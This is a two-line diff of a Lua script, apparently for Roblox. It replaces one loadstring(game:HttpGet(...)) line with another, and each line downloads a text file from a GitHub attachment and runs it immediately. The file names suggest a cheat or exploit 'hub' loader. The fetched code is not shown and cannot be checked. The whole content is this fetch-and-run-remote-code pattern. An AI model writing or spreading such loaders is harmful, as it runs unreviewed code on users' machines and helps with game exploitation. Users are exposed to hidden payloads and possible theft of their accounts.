@@ -1,2 +1,2 @@
+loadstring(game:HttpGet('https://github.com/armch063/n/files/8746911/V3.txt', true))()
 
-loadstring(game:HttpGet("https://github.com/armch063/...../files/8746199/1xliiHubV3.txt", true))()
